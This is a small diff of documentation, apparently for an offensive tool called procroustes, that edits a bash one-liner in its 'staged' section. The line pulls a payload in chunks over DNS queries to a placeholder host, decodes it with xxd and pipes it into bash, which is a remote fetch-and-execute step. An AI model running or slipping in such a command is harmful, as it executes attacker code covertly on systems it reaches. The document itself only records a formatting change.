@@ -71,7 +71,7 @@ procroustes_full/bash:
 ```
 procroustes_full/bash/staged:
 ```bash
-while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(dig +short $i.%UNIQUE_DNS_HOST%);c=$(printf "%02x " ${a[*]}|xxd -r -p);done|bash
+while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(dig +short $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash
 ```
 
 ---------------------------------------
